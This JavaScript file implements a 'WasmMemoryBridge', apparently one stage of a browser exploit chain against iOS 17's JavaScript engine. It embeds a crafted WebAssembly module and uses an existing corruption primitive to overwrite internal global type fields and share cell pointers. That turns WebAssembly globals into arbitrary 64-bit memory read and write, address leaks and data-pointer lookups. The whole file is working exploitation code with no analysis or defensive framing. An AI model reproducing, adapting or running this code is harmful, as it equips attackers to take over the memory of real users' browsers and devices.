(() => {
    "use strict";

    const WASM_BRIDGE = new Uint8Array([
        0, 97, 115, 109, 1, 0, 0, 0,
        1, 9, 2, 96, 0, 1, 126, 96, 1, 126, 0,
        3, 3, 2, 0, 1,
        4, 4, 1, 111, 0, 1,
        5, 3, 1, 0, 1,
        6, 82, 8,
        123, 1, 253, 12, 51, 51, 51, 51, 51, 51, 51, 51,
        51, 51, 51, 51, 51, 51, 51, 51, 11,
        126, 1, 66, 205, 215, 182, 222, 218, 249, 234, 230, 171, 127, 11,
        123, 1, 253, 12, 51, 51, 51, 51, 51, 51, 51, 51,
        51, 51, 51, 51, 51, 51, 51, 51, 11,
        111, 1, 208, 111, 11,
        111, 1, 208, 111, 11,
        111, 1, 208, 111, 11,
        111, 1, 208, 111, 11,
        111, 1, 208, 111, 11,
        7, 29, 4,
        4, 101, 100, 102, 121, 3, 1,
        6, 109, 101, 109, 111, 114, 121, 2, 0,
        3, 98, 116, 108, 0, 0,
        3, 97, 108, 116, 0, 1,
        10, 13, 2,
        4, 0, 35, 1, 11,
        6, 0, 32, 0, 36, 1, 11,
    ]);

    class WasmMemoryBridge {
        constructor() {
            const module = new WebAssembly.Module(WASM_BRIDGE);
            this.addressInstance = new WebAssembly.Instance(module);
            this.valueInstance = new WebAssembly.Instance(module);
            this.storeAddress = this.addressInstance.exports.alt;
            this.loadValue = this.valueInstance.exports.btl;
            this.storeValue = this.valueInstance.exports.alt;
            this.addressInstance[0] = 3;
            this.valueInstance[0] = 3;
            this.anchor = [{}, 1, 8];
            this.anchor.bridgeMarker = 90;
            this.retained = [];
            this.storeAddress(0n);
            this.loadValue();
            this.storeValue(0n);
        }

        adopt(bootstrap) {
            const addressInstance = bootstrap.getObjectAddress(this.addressInstance);
            const valueInstance = bootstrap.getObjectAddress(this.valueInstance);
            const addressState = bootstrap.read64(addressInstance + 0x10n);
            const valueState = bootstrap.read64(valueInstance + 0x10n);
            const addressCell = addressState + 0xb0n;
            const valueCell = valueState + 0xb0n;

            this.addressStorage = bootstrap.read64(addressCell);
            this.valueStorage = bootstrap.read64(valueCell);

            // iOS 17 stores the WebAssembly global's type at state+0x68. A
            // negative-zero JSValue switches both instances to the raw i64
            // path, and sharing their cell pointer turns store/load into an
            // address-selected memory operation.
            bootstrap.write64(addressState + 0x68n, 0x8000000000000000n);
            bootstrap.write64(valueState + 0x68n, 0x8000000000000000n);
            bootstrap.write64(addressCell, valueCell);

            const anchorAddress = bootstrap.getObjectAddress(this.anchor);
            const probe = bootstrap.read64(anchorAddress);
            if (this.read64(anchorAddress) !== probe) {
                throw new Error("Wasm memory bridge read validation failed");
            }
        }

        read64(address) {
            this.storeAddress(BigInt(address));
            return this.loadValue();
        }

        write64(address, value) {
            this.storeAddress(BigInt(address));
            this.storeValue(BigInt(value));
        }

        bindObjectAddress(bootstrap) {
            this.addressCarrier = { value: null };
            this.addressCarrierSlot = bootstrap.getObjectAddress(this.addressCarrier) + 0x10n;
        }

        getObjectAddress(object) {
            this.addressCarrier.value = object;
            return this.read64(this.addressCarrierSlot) & 0x7fffffffffn;
        }

        read32(address) {
            return Number(this.read64(address) & 0xffffffffn);
        }

        write32(address, value) {
            const current = this.read64(address);
            this.write64(address, (current & ~0xffffffffn) | BigInt(Number(value) >>> 0));
        }

        patchByte(address, value) {
            const current = this.read64(address);
            this.write64(address, (current & ~0xffn) | BigInt(value & 0xff));
        }

        readString(address, limit = 768) {
            let result = "";
            for (let offset = 0; offset < limit; offset++) {
                const byte = this.read32(BigInt(address) + BigInt(offset)) & 0xff;
                if (byte === 0) return result;
                result += String.fromCharCode(byte);
            }
            return result;
        }

        getDataPointer(view) {
            const object = view instanceof ArrayBuffer ? new Uint8Array(view) : view;
            return this.read64(this.getObjectAddress(object) + 0x10n) & 0x7fffffffffn;
        }

        allocZeroBuffer(size) {
            const buffer = new Uint8Array(new ArrayBuffer(Number(size)));
            this.retained.push(buffer);
            return this.getDataPointer(buffer);
        }

        allocZeroBufferPair(size) {
            const buffer = new Uint8Array(new ArrayBuffer(Number(size)));
            this.retained.push(buffer);
            return [buffer, this.getDataPointer(buffer)];
        }

        cleanup() {}
    }

    globalThis.createWasmMemoryBridge = () => new WasmMemoryBridge();
})();
